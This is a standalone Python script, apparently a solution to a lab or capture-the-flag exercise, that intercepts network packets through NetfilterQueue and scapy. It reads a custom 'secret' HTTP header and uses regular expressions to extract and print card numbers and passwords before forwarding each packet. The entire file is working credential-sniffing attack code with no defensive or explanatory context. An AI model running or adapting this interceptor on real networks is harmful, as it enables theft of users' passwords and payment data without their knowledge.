from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP
from scapy.layers import http
import re

cards = set()
passes = set()

def print_and_accept(pkt):
    ip = IP(pkt.get_payload())
    if ip.haslayer(http.HTTPRequest):
        secret = ip[http.HTTPRequest].fields['Unknown_Headers']['secret'.encode()].decode()
        card_match = re.search(r'(?<=cc).*?(?P<card>\d+\.\d+\.\d+\.\d+).*', secret)
        password_match = re.search(r'(?<=pwd).*?(?P<pwd>[\dA-Z;:<=>\?@]+).*', secret)
        if card_match:
            card = card_match.group("card")
            if card not in cards:
                print(f'card number : {card}')
            cards.add(card)
        if password_match:
            password = password_match.group("pwd") 
            if password not in passes:
                print(f'password: {password}')
            passes.add(password)
    pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()